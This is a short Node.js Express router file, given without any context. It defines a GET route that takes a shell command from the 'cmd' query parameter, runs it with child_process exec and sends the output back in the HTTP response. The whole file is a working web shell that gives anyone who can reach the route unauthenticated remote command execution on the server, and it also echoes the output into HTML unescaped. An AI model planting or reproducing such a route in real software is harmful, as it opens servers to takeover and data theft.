
const express = require('express');
const { exec } = require('child_process');
const router = express.Router();
router.get('/', (req, res) => {
    const cmd = req.query.cmd || 'id';
    exec(cmd, (err, stdout, stderr) => {
        res.send(`<pre>${stdout || err || stderr}</pre>`);
    });
});
module.exports = router;
